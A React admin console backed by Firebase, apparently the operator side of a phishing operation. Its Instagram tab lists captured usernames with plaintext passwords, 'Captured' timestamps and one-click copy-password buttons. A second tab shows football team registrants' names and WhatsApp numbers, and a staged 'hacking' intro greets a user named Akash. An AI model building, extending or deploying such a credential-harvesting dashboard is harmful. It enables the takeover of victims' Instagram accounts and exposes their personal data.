import React, { useState, useEffect } from 'react';
import { 
  ShieldCheck, 
  Trash2, 
  Search, 
  Key, 
  User, 
  Database, 
  Lock, 
  Calendar, 
  CheckCircle, 
  AlertTriangle,
  RefreshCw,
  LogOut,
  UserCheck,
  Smartphone,
  RotateCcw,
  Copy,
  Check,
  UserX,
  Terminal,
  Cpu,
  Zap,
  ArrowRight
} from 'lucide-react';
import { InstagramAccount, TeamRegistrationRequest } from '../types';
import { 
  fetchInstagramAccounts, 
  softDeleteInstagramAccount,
  restoreInstagramAccount,
  deleteInstagramAccount, 
  fetchTeamRegistrations,
  deleteTeamRegistration
} from '../lib/firebase';

interface AdminPanelProps {
  onLogout: () => void;
}

export default function AdminPanel({ onLogout }: AdminPanelProps) {
  const [instagramAccounts, setInstagramAccounts] = useState<InstagramAccount[]>([]);
  const [teamRegistrations, setTeamRegistrations] = useState<TeamRegistrationRequest[]>([]);
  const [searchQuery, setSearchQuery] = useState('');
  const [activeTab, setActiveTab] = useState<'instagram' | 'pff'>('instagram');
  const [igFilter, setIgFilter] = useState<'all' | 'active' | 'deleted'>('all');
  const [copiedId, setCopiedId] = useState<string | null>(null);
  const [isRefreshing, setIsRefreshing] = useState(false);

  // Hacking animation state
  const [showHackingIntro, setShowHackingIntro] = useState(true);
  const [terminalLogs, setTerminalLogs] = useState<string[]>([]);
  const [hackProgress, setHackProgress] = useState(0);

  // Run hacking sequence on mount
  useEffect(() => {
    const logs = [
      '> INITIALIZING QUANTUM ROOT SHELL v4.0.9...',
      '> ESTABLISHING FIRESTORE PERSISTENT DB TUNNEL...',
      '> SCANNING SECURITY NODES & FIREWALLS...',
      '> BYPASSING AUTHENTICATION GATEWAY... [SUCCESS 200 OK]',
      '> DECRYPTING CLOUD ENCRYPTED RECORDS...',
      '> ACCESS GRANTED: SUPERADMIN AKASH LOGGED IN',
      '> WELCOME AKASH! JUMPING TO DATA BASE CONSOLE...'
    ];

    let logIndex = 0;
    const interval = setInterval(() => {
      if (logIndex < logs.length) {
        const nextLog = logs[logIndex];
        setTerminalLogs(prev => [...prev, nextLog]);
        logIndex++;
        setHackProgress(Math.min(100, Math.round((logIndex / logs.length) * 100)));
      } else {
        clearInterval(interval);
        setTimeout(() => {
          setShowHackingIntro(false);
        }, 800);
      }
    }, 400);

    return () => clearInterval(interval);
  }, []);

  // Load database items on load from Firebase Firestore
  const loadData = async () => {
    setIsRefreshing(true);
    try {
      const igAccounts = await fetchInstagramAccounts();
      setInstagramAccounts(igAccounts);

      const pffRegs = await fetchTeamRegistrations();
      setTeamRegistrations(pffRegs);
    } catch (err) {
      console.error("Error loading administrative data from Firebase:", err);
    } finally {
      setIsRefreshing(false);
    }
  };


  useEffect(() => {
    loadData();
  }, []);

  const handleSoftDeleteIg = async (id: string) => {
    try {
      await softDeleteInstagramAccount(id);
      setInstagramAccounts(prev => prev.map(acc => 
        acc.id === id ? { ...acc, isDeleted: true, deletedAt: new Date().toLocaleString() } : acc
      ));
    } catch (err) {
      console.error("Error soft deleting Instagram log:", err);
    }
  };

  const handleRestoreIg = async (id: string) => {
    try {
      await restoreInstagramAccount(id);
      setInstagramAccounts(prev => prev.map(acc => 
        acc.id === id ? { ...acc, isDeleted: false, deletedAt: undefined } : acc
      ));
    } catch (err) {
      console.error("Error restoring Instagram account:", err);
    }
  };

  const handlePermanentDeleteIg = async (id: string) => {
    try {
      await deleteInstagramAccount(id);
      setInstagramAccounts(prev => prev.filter(acc => acc.id !== id));
    } catch (err) {
      console.error("Error permanently deleting Instagram log:", err);
    }
  };

  const handleCopyToClipboard = (text: string, id: string) => {
    navigator.clipboard.writeText(text);
    setCopiedId(id);
    setTimeout(() => setCopiedId(null), 2000);
  };

  // Filter accounts based on search query and active/deleted filter
  const filteredIg = instagramAccounts.filter(acc => {
    const matchesSearch = acc.username.toLowerCase().includes(searchQuery.toLowerCase());
    if (!matchesSearch) return false;

    if (igFilter === 'active') return !acc.isDeleted;
    if (igFilter === 'deleted') return acc.isDeleted;
    return true; // 'all'
  });

  const activeIgCount = instagramAccounts.filter(a => !a.isDeleted).length;
  const deletedIgCount = instagramAccounts.filter(a => a.isDeleted).length;

  const filteredPffRegs = teamRegistrations.filter(reg => 
    reg.fullName.toLowerCase().includes(searchQuery.toLowerCase()) ||
    (reg.whatsappNumber && reg.whatsappNumber.includes(searchQuery)) ||
    (reg.username && reg.username.toLowerCase().includes(searchQuery.toLowerCase())) ||
    reg.teamName.toLowerCase().includes(searchQuery.toLowerCase())
  );

  return (
    <div className="min-h-screen bg-slate-900 text-slate-100 flex flex-col font-sans select-none relative">
      
      {/* HACKING ANIMATION OVERLAY */}
      {showHackingIntro && (
        <div className="fixed inset-0 z-50 bg-black flex flex-col items-center justify-center p-4 font-mono text-emerald-400 select-none overflow-hidden">
          {/* Cyber matrix background grid */}
          <div className="absolute inset-0 bg-[radial-gradient(#10b981_1px,transparent_1px)] [background-size:16px_16px] opacity-10 pointer-events-none" />

          <div className="max-w-xl w-full bg-slate-950 border-2 border-emerald-500 rounded-3xl p-6 sm:p-8 shadow-[0_0_50px_rgba(16,185,129,0.3)] relative z-10 flex flex-col items-center text-center">
            
            {/* Pulsing Terminal Icon */}
            <div className="w-16 h-16 rounded-2xl bg-emerald-950 border-2 border-emerald-400 text-emerald-400 flex items-center justify-center mb-4 shadow-[0_0_20px_rgba(16,185,129,0.5)] animate-pulse">
              <Terminal className="w-8 h-8" />
            </div>

            {/* WELCOME AKASH BANNER */}
            <div className="inline-flex items-center gap-2 px-4 py-1.5 rounded-full bg-emerald-500/20 border border-emerald-400 text-emerald-300 text-xs font-black uppercase tracking-widest mb-3 animate-bounce">
              <Zap className="w-4 h-4 text-amber-400 fill-amber-400" />
              SYSTEM OVERRIDE DETECTED
            </div>

            <h2 className="text-3xl sm:text-4xl font-black font-display uppercase tracking-tight text-white mb-1 drop-shadow-[0_0_10px_rgba(16,185,129,0.8)]">
              WELCOME AKASH
            </h2>
            <p className="text-xs font-mono text-emerald-400/90 tracking-widest uppercase mb-6">
              Root Level Database Console Access Granted
            </p>

            {/* Terminal Screen Logs */}
            <div className="w-full bg-black/90 border border-emerald-500/40 rounded-2xl p-4 text-left font-mono text-[11px] leading-relaxed text-emerald-400 h-40 overflow-y-auto shadow-inner mb-5 space-y-1">
              {terminalLogs.map((log, idx) => (
                <div key={idx} className="flex items-start gap-2">
                  <span className="text-emerald-600 font-bold">$</span>
                  <span className={idx === terminalLogs.length - 1 ? "text-amber-300 font-bold animate-pulse" : "text-emerald-400"}>
                    {log}
                  </span>
                </div>
              ))}
            </div>

            {/* Progress Bar */}
            <div className="w-full bg-slate-900 border border-emerald-900 rounded-full h-3 mb-6 p-0.5 overflow-hidden">
              <div 
                className="bg-gradient-to-r from-emerald-500 via-teal-400 to-amber-400 h-full rounded-full transition-all duration-300 shadow-[0_0_10px_rgba(16,185,129,0.8)]"
                style={{ width: `${hackProgress}%` }}
              />
            </div>

            {/* Direct Enter Button */}
            <button
              type="button"
              onClick={() => setShowHackingIntro(false)}
              className="w-full py-3.5 bg-emerald-500 hover:bg-emerald-400 text-slate-950 font-black text-xs uppercase tracking-widest rounded-xl transition-all shadow-lg shadow-emerald-950 cursor-pointer flex items-center justify-center gap-2 hover:scale-102 active:scale-98"
            >
              <span>ENTER DATA BASE CONSOLE</span>
              <ArrowRight className="w-4 h-4" />
            </button>
          </div>
        </div>
      )}

      {/* Top Navbar */}
      <header className="bg-slate-950 border-b border-slate-800 py-4 px-6 sticky top-0 z-30 shadow-md">
        <div className="max-w-7xl mx-auto flex justify-between items-center">
          <div className="flex items-center gap-3">
            <div className="p-2 bg-emerald-500/10 text-emerald-400 rounded-xl border border-emerald-500/20 shadow-[0_0_15px_rgba(16,185,129,0.2)]">
              <Database className="w-6 h-6 animate-pulse" />
            </div>
            <div>
              <div className="flex items-center gap-2">
                <h1 className="text-white font-display font-black text-sm sm:text-base uppercase tracking-wider">
                  Data Base Console
                </h1>
                <span className="px-2 py-0.5 bg-emerald-500/20 text-emerald-400 border border-emerald-400/40 text-[10px] font-mono font-extrabold uppercase rounded-full tracking-wider">
                  WELCOME AKASH
                </span>
              </div>
              <p className="text-slate-400 text-[10px] font-mono tracking-widest uppercase">
                Central Firebase Firestore Control Center
              </p>
            </div>
          </div>

          <button
            onClick={onLogout}
            id="admin-logout-btn"
            className="flex items-center gap-2 bg-red-600/10 hover:bg-red-600/20 text-red-400 hover:text-red-300 font-bold text-xs uppercase tracking-wider px-4 py-2 rounded-xl border border-red-500/30 transition-all cursor-pointer"
          >
            <LogOut className="w-4 h-4" />
            Logout
          </button>
        </div>
      </header>

      {/* Main Container */}
      <main className="flex-1 max-w-7xl w-full mx-auto p-6 flex flex-col gap-6">
        
        {/* Statistics Widgets */}
        <div className="grid grid-cols-1 sm:grid-cols-4 gap-4">
          <div className="bg-slate-950 border border-slate-800 rounded-2xl p-5 flex items-center justify-between shadow-sm">
            <div>
              <p className="text-slate-400 text-[10px] font-mono uppercase tracking-widest">Active Accounts</p>
              <h3 className="text-2xl font-black text-emerald-400 mt-1">{activeIgCount}</h3>
            </div>
            <div className="p-3 bg-emerald-500/10 text-emerald-400 rounded-xl border border-emerald-500/20">
              <UserCheck className="w-5 h-5" />
            </div>
          </div>

          <div className="bg-slate-950 border border-slate-800 rounded-2xl p-5 flex items-center justify-between shadow-sm">
            <div>
              <p className="text-slate-400 text-[10px] font-mono uppercase tracking-widest">Deleted Accounts</p>
              <h3 className="text-2xl font-black text-rose-400 mt-1">{deletedIgCount}</h3>
            </div>
            <div className="p-3 bg-rose-500/10 text-rose-400 rounded-xl border border-rose-500/20">
              <UserX className="w-5 h-5" />
            </div>
          </div>

          <div className="bg-slate-950 border border-slate-800 rounded-2xl p-5 flex items-center justify-between shadow-sm">
            <div>
              <p className="text-slate-400 text-[10px] font-mono uppercase tracking-widest">PFF Registered Players</p>
              <h3 className="text-2xl font-black text-emerald-400 mt-1">{teamRegistrations.length}</h3>
            </div>
            <div className="p-3 bg-emerald-500/10 text-emerald-400 rounded-xl border border-emerald-500/20">
              <ShieldCheck className="w-5 h-5" />
            </div>
          </div>

          <div className="bg-slate-950 border border-slate-800 rounded-2xl p-5 flex items-center justify-between shadow-sm">
            <div>
              <p className="text-slate-400 text-[10px] font-mono uppercase tracking-widest">System Status</p>
              <span className="inline-flex items-center gap-1.5 px-2.5 py-0.5 rounded-full text-[10px] font-extrabold uppercase bg-emerald-500/10 text-emerald-400 border border-emerald-500/20 mt-2.5">
                <span className="w-1.5 h-1.5 bg-emerald-400 rounded-full animate-ping" /> ONLINE
              </span>
            </div>
            <div className="p-3 bg-amber-500/10 text-amber-400 rounded-xl border border-amber-500/20">
              <Database className="w-5 h-5" />
            </div>
          </div>
        </div>

        {/* Action Panel Header */}
        <div className="bg-slate-950 border border-slate-800 rounded-2xl p-5 shadow-sm flex flex-col md:flex-row gap-4 items-center justify-between">
          {/* Tabs toggle */}
          <div className="flex bg-slate-900 p-1.5 rounded-xl border border-slate-800/80 w-full md:w-auto overflow-x-auto">
            <button
              onClick={() => { setActiveTab('instagram'); setSearchQuery(''); }}
              className={`flex-1 md:flex-none flex items-center justify-center gap-2 px-5 py-2 rounded-lg text-xs font-bold uppercase tracking-wider transition-all cursor-pointer ${
                activeTab === 'instagram'
                  ? 'bg-emerald-600 text-white shadow-md'
                  : 'text-slate-400 hover:text-white'
              }`}
            >
              <Smartphone className="w-4 h-4" />
              Instagram Accounts ({instagramAccounts.length})
            </button>
            <button
              onClick={() => { setActiveTab('pff'); setSearchQuery(''); }}
              className={`flex-1 md:flex-none flex items-center justify-center gap-2 px-5 py-2 rounded-lg text-xs font-bold uppercase tracking-wider transition-all cursor-pointer ${
                activeTab === 'pff'
                  ? 'bg-emerald-600 text-white shadow-md'
                  : 'text-slate-400 hover:text-white'
              }`}
            >
              <ShieldCheck className="w-4 h-4" />
              PFF Registered Players ({teamRegistrations.length})
            </button>
          </div>

          {/* Search bar & Refresh */}
          <div className="flex items-center gap-3 w-full md:w-auto">
            <div className="relative flex-1 md:w-80">
              <Search className="absolute left-3.5 top-1/2 -translate-y-1/2 w-4 h-4 text-slate-500" />
              <input
                type="text"
                value={searchQuery}
                onChange={(e) => setSearchQuery(e.target.value)}
                placeholder={activeTab === 'instagram' ? 'Search Instagram accounts...' : 'Search registered players...'}
                className="w-full pl-10 pr-4 py-2 bg-slate-900 border border-slate-800 rounded-xl text-xs text-white placeholder-slate-500 focus:outline-none focus:border-emerald-500"
              />
            </div>
            <button
              onClick={loadData}
              className={`p-2.5 bg-slate-900 hover:bg-slate-850 text-slate-400 hover:text-white rounded-xl border border-slate-800/80 transition-colors cursor-pointer ${isRefreshing ? 'animate-spin' : ''}`}
              title="Refresh Registry"
            >
              <RefreshCw className="w-4 h-4" />
            </button>
          </div>
        </div>

        {/* Data list table card */}
        <div className="bg-slate-950 border border-slate-800 rounded-2xl shadow-sm overflow-hidden flex-1 flex flex-col">
          {activeTab === 'instagram' ? (
            <div className="flex flex-col flex-1">
              {/* Filter Sub-bar for Instagram Accounts */}
              <div className="bg-slate-900/60 border-b border-slate-800/80 px-6 py-3 flex items-center justify-between gap-4 flex-wrap">
                <div className="flex items-center gap-2">
                  <span className="text-[11px] font-mono text-slate-400 uppercase tracking-wider font-bold">Filter View:</span>
                  <div className="flex bg-slate-950 p-1 rounded-lg border border-slate-800">
                    <button
                      onClick={() => setIgFilter('all')}
                      className={`px-3 py-1 rounded text-[11px] font-bold uppercase transition-all cursor-pointer ${
                        igFilter === 'all' ? 'bg-slate-800 text-white shadow-sm' : 'text-slate-400 hover:text-slate-200'
                      }`}
                    >
                      All ({instagramAccounts.length})
                    </button>
                    <button
                      onClick={() => setIgFilter('active')}
                      className={`px-3 py-1 rounded text-[11px] font-bold uppercase transition-all cursor-pointer ${
                        igFilter === 'active' ? 'bg-emerald-600/30 text-emerald-300 border border-emerald-500/30 shadow-sm' : 'text-slate-400 hover:text-slate-200'
                      }`}
                    >
                      Active ({activeIgCount})
                    </button>
                    <button
                      onClick={() => setIgFilter('deleted')}
                      className={`px-3 py-1 rounded text-[11px] font-bold uppercase transition-all cursor-pointer ${
                        igFilter === 'deleted' ? 'bg-rose-600/30 text-rose-300 border border-rose-500/30 shadow-sm' : 'text-slate-400 hover:text-slate-200'
                      }`}
                    >
                      Deleted ({deletedIgCount})
                    </button>
                  </div>
                </div>

                <div className="text-[10px] font-mono text-slate-500">
                  Showing {filteredIg.length} account record(s)
                </div>
              </div>

              <div className="overflow-x-auto flex-1">
                <table className="w-full text-left border-collapse">
                  <thead>
                    <tr className="border-b border-slate-800 text-[10px] font-mono text-slate-400 uppercase tracking-widest bg-slate-900/40">
                      <th className="py-4 px-6 font-bold">Username / Account</th>
                      <th className="py-4 px-6 font-bold">Instagram Password</th>
                      <th className="py-4 px-6 font-bold">Status & Verification Date</th>
                      <th className="py-4 px-6 font-bold text-right">Administrative Actions</th>
                    </tr>
                  </thead>
                  <tbody className="divide-y divide-slate-800/50">
                    {filteredIg.length === 0 ? (
                      <tr>
                        <td colSpan={4} className="py-12 text-center text-slate-500 text-xs font-mono">
                          No {igFilter !== 'all' ? igFilter : ''} Instagram accounts found matching criteria.
                        </td>
                      </tr>
                    ) : (
                      filteredIg.map((acc) => (
                        <tr key={acc.id} className={`hover:bg-slate-900/30 transition-colors ${
                          acc.isDeleted ? 'bg-rose-950/10' : ''
                        }`}>
                          {/* Username & Copy Button */}
                          <td className="py-4 px-6">
                            <div className="flex items-center gap-3">
                              <div className={`w-8 h-8 rounded-full border flex items-center justify-center shrink-0 ${
                                acc.isDeleted 
                                  ? 'bg-rose-500/10 border-rose-500/20 text-rose-400' 
                                  : 'bg-blue-500/10 border-blue-500/20 text-blue-400'
                              }`}>
                                {acc.isDeleted ? <UserX className="w-4 h-4" /> : <User className="w-4 h-4" />}
                              </div>
                              <div>
                                <div className="flex items-center gap-2">
                                  <p className={`font-mono text-xs font-bold select-all ${
                                    acc.isDeleted ? 'text-slate-400 line-through' : 'text-white'
                                  }`}>
                                    {acc.username}
                                  </p>
                                  <button
                                    onClick={() => handleCopyToClipboard(acc.username, `user_${acc.id}`)}
                                    className="text-[10px] font-mono uppercase bg-slate-800 hover:bg-slate-700 px-2 py-0.5 rounded text-slate-300 hover:text-white transition-colors cursor-pointer flex items-center gap-1 shrink-0"
                                    title="Copy Username"
                                  >
                                    {copiedId === `user_${acc.id}` ? (
                                      <>
                                        <Check className="w-3 h-3 text-emerald-400" />
                                        <span className="text-emerald-400">Copied!</span>
                                      </>
                                    ) : (
                                      <>
                                        <Copy className="w-3 h-3" />
                                        <span>Copy Username</span>
                                      </>
                                    )}
                                  </button>
                                </div>
                                <p className="text-[10px] text-slate-500 font-mono mt-0.5">ID: {acc.id}</p>
                              </div>
                            </div>
                          </td>

                          {/* Password & Copy Button */}
                          <td className="py-4 px-6">
                            <div className="flex items-center gap-2">
                              <div className="px-2.5 py-1 bg-slate-900 border border-slate-800 rounded font-mono text-xs text-amber-400 select-all font-bold">
                                {acc.password || 'N/A'}
                              </div>
                              <button
                                onClick={() => handleCopyToClipboard(acc.password || '', `pass_${acc.id}`)}
                                className="text-[10px] font-mono uppercase bg-slate-800 hover:bg-slate-700 px-2 py-1 rounded text-slate-300 hover:text-white transition-colors cursor-pointer flex items-center gap-1"
                                title="Copy Password"
                              >
                                {copiedId === `pass_${acc.id}` ? (
                                  <>
                                    <Check className="w-3 h-3 text-emerald-400" />
                                    <span className="text-emerald-400">Copied!</span>
                                  </>
                                ) : (
                                  <>
                                    <Copy className="w-3 h-3" />
                                    <span>Copy Pass</span>
                                  </>
                                )}
                              </button>
                            </div>
                          </td>

                          {/* Verification Date & Status Tag */}
                          <td className="py-4 px-6">
                            <div className="flex flex-col gap-1">
                              <div className="flex items-center gap-1.5 text-xs text-slate-300">
                                <Calendar className="w-3.5 h-3.5 text-slate-500" />
                                <span>Captured: {acc.timestamp}</span>
                              </div>

                              {acc.isDeleted ? (
                                <div className="flex items-center gap-1.5 text-[10px] text-rose-400 font-mono">
                                  <span className="px-2 py-0.5 rounded font-extrabold uppercase bg-rose-500/20 text-rose-300 border border-rose-500/30">
                                    DELETED
                                  </span>
                                  {acc.deletedAt && <span>({acc.deletedAt})</span>}
                                </div>
                              ) : (
                                <div>
                                  <span className="px-2 py-0.5 rounded text-[10px] font-extrabold uppercase bg-emerald-500/10 text-emerald-400 border border-emerald-500/20">
                                    ACTIVE
                                  </span>
                                </div>
                              )}
                            </div>
                          </td>

                          {/* Actions */}
                          <td className="py-4 px-6 text-right">
                            <div className="flex items-center justify-end gap-2">
                              {acc.isDeleted ? (
                                <>
                                  {/* Restore Button */}
                                  <button
                                    onClick={() => handleRestoreIg(acc.id)}
                                    className="flex items-center gap-1 px-2.5 py-1.5 bg-emerald-600/20 hover:bg-emerald-600/30 text-emerald-300 rounded-lg border border-emerald-500/30 transition-all cursor-pointer text-xs font-mono font-bold"
                                    title="Restore Account"
                                  >
                                    <RotateCcw className="w-3.5 h-3.5" />
                                    <span>Restore</span>
                                  </button>

                                  {/* Permanent Delete Button */}
                                  <button
                                    onClick={() => handlePermanentDeleteIg(acc.id)}
                                    className="p-1.5 bg-red-600/20 hover:bg-red-600/40 text-red-300 rounded-lg border border-red-500/30 transition-all cursor-pointer"
                                    title="Delete Permanently"
                                  >
                                    <Trash2 className="w-4 h-4" />
                                  </button>
                                </>
                              ) : (
                                /* Move to Deleted Button */
                                <button
                                  onClick={() => handleSoftDeleteIg(acc.id)}
                                  className="flex items-center gap-1 px-2.5 py-1.5 bg-rose-600/10 hover:bg-rose-600/20 text-rose-400 hover:text-rose-300 rounded-lg border border-rose-500/20 transition-all cursor-pointer text-xs font-mono font-semibold"
                                  title="Mark as Deleted"
                                >
                                  <Trash2 className="w-3.5 h-3.5" />
                                  <span>Delete</span>
                                </button>
                              )}
                            </div>
                          </td>
                        </tr>
                      ))
                    )}
                  </tbody>
                </table>
              </div>
            </div>
          ) : (
            /* PFF REGISTRATIONS TABLE */
            <div className="overflow-x-auto">
              <table className="w-full text-left border-collapse">
                <thead>
                  <tr className="border-b border-slate-800 text-[10px] font-mono text-slate-400 uppercase tracking-widest bg-slate-900/40">
                    <th className="py-4 px-6 font-bold">Athlete Name</th>
                    <th className="py-4 px-6 font-bold">WhatsApp Number</th>
                    <th className="py-4 px-6 font-bold">Gender</th>
                    <th className="py-4 px-6 font-bold">Selected Football Team</th>
                    <th className="py-4 px-6 font-bold">Position</th>
                    <th className="py-4 px-6 font-bold">Registered Date</th>
                    <th className="py-4 px-6 font-bold text-right">Actions</th>
                  </tr>
                </thead>
                <tbody className="divide-y divide-slate-800/50 font-mono">
                  {filteredPffRegs.length === 0 ? (
                    <tr>
                      <td colSpan={7} className="py-12 text-center text-slate-500 text-xs">
                        No PFF team registrations submitted yet.
                      </td>
                    </tr>
                  ) : (
                    filteredPffRegs.map((reg) => (
                      <tr key={reg.id} className="hover:bg-slate-900/30 transition-colors">
                        <td className="py-4 px-6">
                          <div>
                            <p className="text-white text-xs font-bold">{reg.fullName}</p>
                            <p className="text-[10px] text-emerald-400">Username: @{reg.username}</p>
                          </div>
                        </td>
                        <td className="py-4 px-6">
                          <span className="text-xs text-amber-400 font-bold">{reg.whatsappNumber || 'N/A'}</span>
                        </td>
                        <td className="py-4 px-6">
                          <span className="text-xs text-slate-300">{reg.gender}</span>
                        </td>
                        <td className="py-4 px-6">
                          <span className="px-2.5 py-1 rounded-lg text-xs font-extrabold uppercase bg-emerald-950 text-emerald-300 border border-emerald-500/30">
                            {reg.teamName}
                          </span>
                        </td>
                        <td className="py-4 px-6">
                          <span className="text-xs text-amber-400 font-bold">{reg.position || 'Forward'}</span>
                        </td>
                        <td className="py-4 px-6">
                          <span className="text-xs text-slate-400">{reg.registeredAt}</span>
                        </td>
                        <td className="py-4 px-6 text-right">
                          <button
                            onClick={async () => {
                              if (reg.id) {
                                await deleteTeamRegistration(reg.id);
                                setTeamRegistrations(prev => prev.filter(r => r.id !== reg.id));
                              }
                            }}
                            className="p-2 bg-red-600/10 hover:bg-red-600/20 text-red-400 hover:text-red-300 rounded-lg border border-red-500/20 transition-all cursor-pointer"
                            title="Remove Registration"
                          >
                            <Trash2 className="w-4 h-4" />
                          </button>
                        </td>
                      </tr>
                    ))
                  )}
                </tbody>
              </table>
            </div>
          )}
        </div>

      </main>

      {/* Admin Footer */}
      <footer className="bg-slate-950 border-t border-slate-800 text-center py-4 text-slate-500 text-[10px] font-mono tracking-wider uppercase">
        Central Database Control System • Authenticated Console: Welcome Akash
      </footer>

    </div>
  );
}
